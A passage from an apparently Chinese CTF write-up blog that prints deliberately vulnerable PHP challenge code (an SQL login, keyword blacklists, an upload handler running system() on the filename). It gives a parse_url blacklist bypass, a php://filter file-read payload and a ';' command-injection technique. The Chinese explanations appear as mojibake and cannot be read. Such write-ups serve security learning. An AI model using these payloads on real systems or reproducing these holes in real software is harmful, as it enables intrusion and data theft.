</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s2">&#34;config.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">Hacker</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Header</span><span class="p">(</span><span class="s2">&#34;Location: hacker.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter_directory</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$keywords</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span><span class="s2">&#34;manage&#34;</span><span class="p">,</span><span class="s2">&#34;ffffllllaaaaggg&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$uri</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REQUEST_URI&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$uri</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">],</span> <span class="nv">$query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//    var_dump($query);
</span></span></span><span class="line"><span class="cl"><span class="c1">//    die();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$keywords</span> <span class="k">as</span> <span class="nv">$token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$query</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$k</span><span class="p">,</span> <span class="nv">$token</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="nx">hacker</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="nv">$token</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="nx">hacker</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter_directory_guest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$keywords</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span><span class="s2">&#34;manage&#34;</span><span class="p">,</span><span class="s2">&#34;ffffllllaaaaggg&#34;</span><span class="p">,</span><span class="s2">&#34;info&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$uri</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REQUEST_URI&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$uri</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">],</span> <span class="nv">$query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//    var_dump($query);
</span></span></span><span class="line"><span class="cl"><span class="c1">//    die();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$keywords</span> <span class="k">as</span> <span class="nv">$token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$query</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$k</span><span class="p">,</span> <span class="nv">$token</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="nx">hacker</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="nv">$token</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="nx">hacker</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">Filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$mysqli</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="s2">&#34;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$whitelist</span> <span class="o">=</span> <span class="s2">&#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;(),_*`-@=+&gt;&lt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$whitelist</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">Hacker</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="si">$blacklist</span><span class="s2">/is&#34;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Hacker</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$string</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">real_escape_string</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">sql_query</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$mysqli</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">login</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">Filter</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pass</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select * from `albert_users` where `username_which_you_do_not_know`= &#39;</span><span class="si">$user</span><span class="s2">&#39; and `password_which_you_do_not_know_too` = &#39;</span><span class="si">$pass</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$sql</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$res</span> <span class="o">=</span> <span class="nx">sql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//    var_dump($res);
</span></span></span><span class="line"><span class="cl"><span class="c1">//    die();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$res</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$res</span><span class="o">-&gt;</span><span class="na">fetch_array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="nx">username_which_you_do_not_know</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;isadmin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="nx">isadmin_which_you_do_not_know_too_too</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">updateadmin</span><span class="p">(</span><span class="nv">$level</span><span class="p">,</span><span class="nv">$user</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#39;</span><span class="si">$level</span><span class="s2">&#39; where `username_which_you_do_not_know`=&#39;</span><span class="si">$user</span><span class="s2">&#39; &#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$sql</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$res</span> <span class="o">=</span> <span class="nx">sql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//    var_dump($res);
</span></span></span><span class="line"><span class="cl"><span class="c1">//    die();
</span></span></span><span class="line"><span class="cl"><span class="c1">//    die($res);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$res</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">register</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$mysqli</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">Filter</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pass</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#39;</span><span class="si">$user</span><span class="s2">&#39;,&#39;</span><span class="si">$pass</span><span class="s2">&#39;,&#39;0&#39;)&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$res</span> <span class="o">=</span> <span class="nx">sql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">insert_id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">logout</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">session_destroy</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Header</span><span class="p">(</span><span class="s2">&#34;Location: index.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$keywords</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span><span class="s2">&#34;manage&#34;</span><span class="p">,</span><span class="s2">&#34;ffffllllaaaaggg&#34;</span><span class="p">,</span><span class="s2">&#34;info&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$uri</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REQUEST_URI&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$uri</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">],</span> <span class="nv">$query</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÁî®Âà∞parse_urlÁöÑËß£ÊûêÊºèÊ¥ûÔºåÂú®<code>/user.php</code>ÂâçÈù¢Âä†ÊñúÊù†ÔºåÂ∞±‰ºöË¢´ÂΩìÊàêhostËß£ÊûêÔºåËøîÂõûfalseÁªïËøáÈªëÂêçÂçï</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">FLAG_SIG</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;you can not visit it directly&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;you can find sth in m4aaannngggeee&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÊèêÁ§∫<code>templates/upload.html</code></p>
<p>ÂèëÁé∞upllloadddd.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$allowtype</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;gif&#34;</span><span class="p">,</span><span class="s2">&#34;png&#34;</span><span class="p">,</span><span class="s2">&#34;jpg&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$size</span> <span class="o">=</span> <span class="mi">10000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$path</span> <span class="o">=</span> <span class="s2">&#34;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">is_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span><span class="nv">$path</span><span class="o">.</span><span class="nv">$filename</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error:can not move&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error:not an upload fileÔºÅ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$newfile</span> <span class="o">=</span> <span class="nv">$path</span><span class="o">.</span><span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;file upload success&lt;br /&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$picdata</span> <span class="o">=</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&#34;</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s2">&#34; | base64 -w 0&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;img src=&#39;data:image/png;base64,&#34;</span><span class="o">.</span><span class="nv">$picdata</span><span class="o">.</span><span class="s2">&#34;&#39;&gt;&lt;/img&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;error&#39;</span><span class="p">]</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$newfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Upload file error: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$ext</span> <span class="o">=</span> <span class="nx">array_pop</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span><span class="nv">$allowtype</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$newfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$picdata</span> <span class="o">=</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&#34;</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s2">&#34; | base64 -w 0&#34;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÂèØ‰ª•Áî®<code>;</code>ÊãºÊé•ÂëΩ‰ª§Êù•ÊâßË°å</p>
<p>ÊâæÂà∞ÂâçÈù¢ËÉΩ‰∏ä‰º†ÁöÑÂú∞Êñπ</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426234534442.png"
	width="1824"
	height="695"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426234534442_hu10228160531234192189.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250426234534442_hu5906908218851076777.png 1024w"
	loading="lazy"
	
		alt="image-20250426234534442"
	
	
		class="gallery-image" 
		data-flex-grow="262"
		data-flex-basis="629px"
	
></p>
<p>ÊñúÊù†Ë¢´ËøáÊª§‰∫ÜÔºå<code>cd ..</code>Âõû‰∏äÁ∫ßÁõÆÂΩïÔºåÂÖ∂ÂÆûÂä†‰∏™#Â∞±‰∏çÁî®base64Ëß£Á†Å‰∫Ü</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426234701353.png"
	width="1870"
	height="710"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426234701353_hu14568612527962215450.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250426234701353_hu9984196377056550042.png 1024w"
	loading="lazy"
	
		alt="image-20250426234701353"
	
	
		class="gallery-image" 
		data-flex-grow="263"
		data-flex-basis="632px"
	
></p>
<h2 id="gyctf2020easyphp">[GYCTF2020]Easyphp
</h2><p>www.zip‰∏ãËΩΩÊ∫êÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">safe</span><span class="p">(</span><span class="nv">$parm</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$array</span><span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;union&#39;</span><span class="p">,</span><span class="s1">&#39;regexp&#39;</span><span class="p">,</span><span class="s1">&#39;load&#39;</span><span class="p">,</span><span class="s1">&#39;into&#39;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span><span class="s1">&#39;file&#39;</span><span class="p">,</span><span class="s1">&#39;insert&#39;</span><span class="p">,</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span><span class="s1">&#39;\\&#39;</span><span class="p">,</span><span class="s2">&#34;*&#34;</span><span class="p">,</span><span class="s2">&#34;alter&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span><span class="s1">&#39;hacker&#39;</span><span class="p">,</span><span class="nv">$parm</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
